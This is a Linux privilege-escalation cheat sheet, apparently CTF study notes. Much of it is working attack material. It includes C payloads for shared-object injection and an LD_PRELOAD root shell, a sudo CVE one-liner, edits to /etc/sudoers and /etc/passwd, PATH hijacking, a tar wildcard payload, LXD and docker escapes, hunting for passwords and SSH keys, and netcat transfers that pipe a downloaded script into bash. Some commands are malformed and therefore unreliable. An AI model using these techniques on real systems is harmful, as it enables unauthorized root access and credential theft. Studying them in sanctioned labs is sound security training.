# << LINUX NOTES >> #

# CONTENTS #

- ## Shell Stabilisation ##
In order to ensure that we dont accidentally lose our shell by using CTRL+C to end a process, we stabilise it. Stabilising also gives us the ability to run sudo, and use things like nano (as we need a pty for that).

### *PYTHON:* ###
Find which version of python is on the system:
```bash
which python
```
The following means that CTRL+C doesnt close our shell, and also gives us autocomplete:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
**< BACKGROUND NC SESSION WITH CTRL+Z >**
```bash
stty raw -echo
fg
```
**< HIT ENTER A FEW TIMES >**

Set the terminal to deal with things - if 256 colour doesnt work then just use 'xterm'.
```bash
reset
export TERM=xterm-256color
```

### *'/usr/bin/script -qc /bin/bash /dev/null':* ###
This is another alternative to spawning a pty instead of with Python. We then need to background the session and use our 'stty raw -echo' etc, as with the Python stabilisation.

Should you wish to have the number of columns and rows displaying to you match your terminal, run 'stty size' on your local machine.
The first number is the number of rows, the second the number of columns. Now, on the remote shell, run:
```bash
stty rows <row-num> columns <column-num>
```

- ## Enumeration ##
Probably the first command you want to run is 'id'. This will tell you your username, and what groups you belong to. This is useful information to know for later enumeration. 

We should also check the 'history' command and the user history files to see if anything important has been run that can clue us in (or even passwords entered on the command line).

### *Find Command:* ###
Once we know our username, user id, and group names and ids, we can begin enumeration with the find command. 

  - #### *Files we own:* ####
  ```bash
  find / -user <our username> 2>/dev/null
  ```

  - #### *Files belonging to our group:* ####
  ```bash
  find / -group <group-name> 2>/dev/null
  ```

  - #### *Files that we can write to:* ####
  ```bash
  find / -type f -writable 2>/dev/null
  ```
  We can replace '-writable' with '-readable' also, as well as changing '-type f' to '-type d' to search for directories. 

  - #### *Files of a particular extension:* ####
  ```bash
  find / -type f -name *.<ext> 2>/dev/null
  ```

  - #### *Finding Useful items:* ####
  ```bash
  PASSWORD INFO
  grep -rnw '/' -ie "pass" 2>/dev/null #Search for any files containing the string pass. also search for pass*= to count password= passwd= etc.

  #SSH KEYS
  find / -name authorized_keys -exec ls -la {} \;
  find / -name id_rsa* -exec ls -la {}; cat {} \;
  ```

We can run the find command with '-exec ls -la {} \;' to run a command upon every result found (the result of find is filled into the {}).
It is worth noting that we can pipe (|) into 'grep -v '<str1>\|<str2>...' to filter out results we do not want.
A useful thing to do is redirect the results to a file (/tmp is typically a word writeable directory), and then go through.


### *Useful Files and Directories to Check:* ###
  - #### *DIRECTORIES:* ####
      - /home/* - all users home directories
      - /home/*/.ssh - if we can write to a user's ssh directrory, or create one then we can gain a foothold as a different user
      - /var/backups - typical back up folder
      - /tmp - temporary storage for system processes
      - /var/tmp - temporary storage for system processes
      - /opt - additional packages/software
      - /var/mail - mail directory (also /var/spool/mail)
      - /var/www/* - web directory, often containing the web log file or database which we can look through for credentials.
      - /etc/sudoers.d/ - can contain files which contain sudo information for specific users.

  - #### *FILES:* ####
      - /etc/passwd - cat and pipe into 'grep -v nologin' to find names of all users on the box that have shells. If writeable we can duplicate the root users line and just generate a password hash with: ```bash openssl passwd -1 -salt <salt> <password>```, then place it in the position of the password. Interestingly, an ! in the second column represents that the account is locked, whereas a * means there is no password required to access this account.
      - /etc/group - cat this to find a list of groups and which users are in which group.
      - /etc/sudoers - we may be able to read sudo permissions of users without using sudo -l, hoping for a NOPASSWD entries so that we may use and exploit. If this file is writeable, we can append this line to give ourselves sudo access to all commands to privesc with: ```bash echo "<username> ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers ```
      - /home/*/.ssh/id_rsa - this is a users ssh private key and if we can access it, we can copy to our system and ssh in as that user.
      - /home/*/.ssh/authorized_keys - if this file is writeable, we can add our own public key to it. Also, If we can make a directory of .ssh and then create an authorized_key file for the user.
      - /home/*/.bash_history - useful for seeing if a user typed a password on the command line, or any other useful information.
      
      IT IS WORTH NOTING: When a directory is executable but not readable, we must know which files are in there to be able to gaina ccess to them - a simple 'ls' command will not work in showing us the files inside. It is worth trying to list all users id_rsa files in /home/user/.ssh/id_rsa, just in case they have set permissions incorrectly so that everyone may read this file. Likewise, checking to see if we can write to their authorized_keys file in the same directory is just as crucial, as we may be able to get ourselves a backdoor this way (as discussed above).


### *Suid Files:* ###
List all files that you can access that have SUID permissions
```bash
find / -perm -4000 2>/dev/null
```
Check on https://gtfobins.github.io/ for anything useful. 
Sometimes the results will contain something cutsom which you can go on to enumerate, reverse engineer, and exploit.


One interesting idea with suid came about when exploiting this room: https://tryhackme.com/jr/zsecurityctf1 on Try Hack Me. When you have higher permissions on the cp command, you can create your own version of the passwd file, or sudoers file, and then add yourself a backdoor in (whether a backdor user in the case of the passwd file, adjusting a users group in the passwd file, or giving them sudo permissions to execute a vulnerable binary as root). The same can apply with sudo.


### *Shared Object Injection:* ###
When a file has SUID permissions, or sudo permissions, we can potentially use it to priv esc. If no GTFO bin exists, and we cnanot exploit in another way, then we can use 'strace' to find out what a binary is actually doing, and look for specific things. We are looking for what it is trying to access, but failing to.

```bash
strace /usr/local/bin/suid-binary 2>&1 | grep "open|access|no such file"
```

We are looking for read write access to a particular file that is being loaded in (.so files). We can replace the code within the file (or create a file if it cannot be found), with our own malicious code:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash"); //creates a suid copy of the bash binary in /tmp/bash
}

//compile with 'gcc -shared -fPIC -o file.so file.c'
```


### *Sudo:* ###
List which files you have sudo permissions for:

```bash
sudo -l
```

Check on https://gtfobins.github.io/ for anything useful. 
Sometimes the results will contain something custom which you can go on to enumerate, reverse engineer, and exploit.
If the output is something like 'ALL = (jones) /usr/local/bin/mycommand', then we can run 'mycommand' as the 'jones' user. We do this with:

```bash
sudo -u jones /usr/local/bin/mycommand
```

Probably one of the biggest Sudo exploits is [CVE-2019-14287](https://www.exploit-db.com/exploits/47502). If the user has sudo permissions: '(ALL, !root) ALL', this can be exploited. A FULL TTY IS REQUIRED (so stabilise your shell).

```bash
sudo -u#-1 /bin/bash -p
```

One other Sudo CVE is [CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c), which is a buffer overflow exploit. If password feedback is enabled in the /etc/sudoers file with a sudo version of 1.8.26 or below, then the sudo version is vulnerable. Password feedback is when you type a character and an * or symbol shows up to identify that you have typed in a key.


### *LD_PRELOAD SUDO LINE:* ###
Should your SUDO permissions include a line that has 'env_keep+=LD_PRELOAD', then you are able to load in custom code which will run when sudo is called on a valid commmand which your user has sudo access for. The loaded in code itself is run with special permissions, meaning we can set the uid and group id to escalate ourselves to another user (root).:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}

// we compile this with 'gcc -fPIC -shared -o shell.so shell.c -nostartfiles' when our file is called shell.c
```


### *Capabilities:* ###
List all capabilities that applications have:
```bash
getcap -r / 2>/dev/null
```
Check on https://gtfobins.github.io/ for anything useful.

'cap_setuid' is an interesting capability. Even though the program is not a SUID file itslef, it has permissions to run code that sets the user id, and group id.

'ep' is another interesting capability, meaning the binary has all capabilities.


### *ENVIRONMENT Variable Exploitation:* ###
When we have access to a binary that is SUID, this obviously allows for a privilege escalation vector (whether lateral or upwards). Even better if we have access to the code behind the binary... if not we can reverse engineer it, running it to find out what it is doing, decompiling in Ghidra, running 'strings' or 'strace' and analysing it. The main thing we are looking for, is a command that is run without its full path. For example running 'date' rather than '/usr/bin/date'.

Linux looks for binaries in a way which makes it exploitable. It will look in the user's PATH variable, which contains a lists of directories. Therefore, if we prepend '/tmp:' to the beginning of the PATH variable, then make our own 'date' file that is executable in the /tmp folder, we can make the program run whatever code we wish, with privileges of the user which the program runs as.

```bash
export PATH=/tmp:$PATH
```

Likewise, if a binary is using an environment variable that is within our control, we can change it and make the program execute differently.
```bash
env #prints all environment variables.
```

So, what do we do if the suid binary uses the full path to call a system command... simple - define a fucntion with that as the name! Let's say that the suid binary calls /usr/bin/date. We create a bash function containing malicious code with this name and export it, then run the suid binary again and instead of calling the date command, it runs our code. Clever!

```bash
function /usr/bin/date() { cp /bin/bash /tmp && chmod +s /tmp/bash; }
export -f /usr/bin/date
```


### *Python Import Exploitation:* ###
In a similar way to PATH exploitation, we can exploit the way in which python programs import modules or libraries too...

Python will look in the current folder with the rest fo the .py code files. It then goes off to the python root folder (/usr/local/python*). If these are writeable, or the folder is writeable by us then we can create our own code to be imported and run. Alternatively, we can check the PYTHONPATH environment variable to specify where it imports from, and perhaps change this if we are given permission to do so. This videos shows this: https://www.youtube.com/watch?v=ZwYqDZOvUpY&feature=emb_title


### *Processes:* ###
To quickly find sechedules tasks, we can run donwload and run [pspy](https://github.com/DominicBreuker/pspy). This tells us all processes that are running as they run. Using the -i flag, we can specify how often the scan should occur in milliseconds.

Other useful commands:
```bash
crontab -l
cat /etc/crontab
cat /etc/cron*

systemctl list-timers --all

ps -aux #List all services running.
ps -eaf --forest #Shows in a nice format, and clearly shows children processes.
```

Crontab has a PATH variable which it uses to define where it will look for binaries to run. Therefore, if a cron job is set up which does not specify the full path to the binary, it can be exploited by placing a malicious binary with the same name within the path, hopefully sooner along than where the script/command running is. Of course, if you can edit the file which is called anyway, then you are sorted, and should just do that.



### *Wildcard Exploitation:* ###
If a command is scheduled to run with wildcards, you can exploit this in a very interesting way... this is often used to break out of containers or priv esc to root.

A straightforward example: create a file called '-la', then run 'ls *'. the file called -la is interpreted as an argument option for the ls command. Therefore, ls -la is what the system runs.

A privesc example of this:
```bash
#When you see this: 'tar cf archive.tar *':

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh

# Once the scirpt is executed, you will be able to run /tmp/bash -p to escalate to the user who owns the file.
```


### *NFS ROOT SQUASHING:* ###
You are looking for 'no_root_squash' on a mount point mentioned in the /etc/exports file.
We can then mount the vulnerable share, create a SUID copy of bash and put it into this share, or create a malicious binary, providing it with SUID permissions and setting UID and GID to 0 in the binary, before running a command requiring root privileges.

```bash
cat /etc/exports # The file which tells what folders can be mounted as a file share. 
```


### *Docker:* ###
If the user is in the docker group, you can escalate with no special permissions:
```bash
docker run -it --rm -v $PWD:/mnt bash
```


### *LXD Group Privesc:* ###
If the user is in the lxd group, then you can escalate again with no special permissions:
```bash
#Often the git cloning will be run on your machine and then the file transferred over.
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

#The image would be transferred to the remote machine here.

lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact
lxc start mycontainer
lxc exec mycontainer /bin/sh
```


### *KERNEL EXPLOITS:* ###
```bash
#Show Kernel information:
uname -a 
cat /proc/version

#Find the machines architecture (64 bit, 32 bit, number of CPUs)
lscpu 
```
The above will show you the kernel version you are running. It is now as striaghtforward as searching for exploits on exploitdb, or using searchsploit.


## *Internal Network Enumeration:* ##
```bash
#Shows ip information
ifconfig 
ip a

#Show routing information
route
ip route

#Arp information
arp -a
ip neigh
cat /proc/net/arp

#Show which ports are available/operational on the machine
#We are looking for 127.0.0.1:<port num> to tell us that there is a port open only for the localhost. 
netstat -ano
```

## *Port Forwarding/Tunnelling:* ##
Should there be any information from netstat (a port only open to localhost for example), we can create a port forward/tunnel with [SOCAT](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat), using the command below to forward our traffic on to the local port:

```bash
socat tcp-listen:8001,reuseaddr,fork tcp:localhost:22 #opens port 8001 and any traffic received onto that port will be forwarded onto localhost port 22. 
#In this case, allowing a locally only available ssh port to work through port 8001 of the machine from externally.

#Similar can also be achieved with ssh if it is enabled (and we have a password):
ssh -L 9000:imgur.com:80 user@0.0.0.0.
#-L is a local tunnel (YOU <-- CLIENT). You can forward a connection back to you. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

#-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
```


## *Transferring Files On and Off Linux Machines:* ##
- ### *Python* ###
```bash
# Change to the folder that the file is in.
python -m SimpleHTTPServer 8080
python3 -m http.server 8080

#Then use 'wget <ip>:<port>/<file>' to download.
```

- ### *SCP* ###
```bash
#REQUIRES an ssh private key or a password.

#From your machine
scp <file> user@<remoteip>:<dest path on remote host>

#To your machine
scp user@<remoteip>:<path on remote host> <dest path on your machine>
```

- ### *Netcat* ###
```bash
#On receiving machine:
nc -lvnp 8080 > file.out

#On Sending Machine:
nc <receiving machine IP> 8080 < file
```

## *Automated Enumeration Scripts:* ##
Enumeration scripts are useful as they are pre set and run the same every time. They are to be transferred onto the box, piped directly into bash so we do not write to the file system. We could also send direct back through a netcat port to our machine to store there:
```bash
# start a python http server
python3 -m http.server 80

# run a listener on your machine:
nc -lvnp 53 > linpeas.output

#
wget http://0.0.0.0:8080/linpeas.sh | bash > nc 10.0.0.1 53
```
  - [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  - [LinENUM](https://github.com/rebootuser/LinEnum)
  - [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) - suggests exploits to use based on the box you are on. Saves a TONNE of time.

  
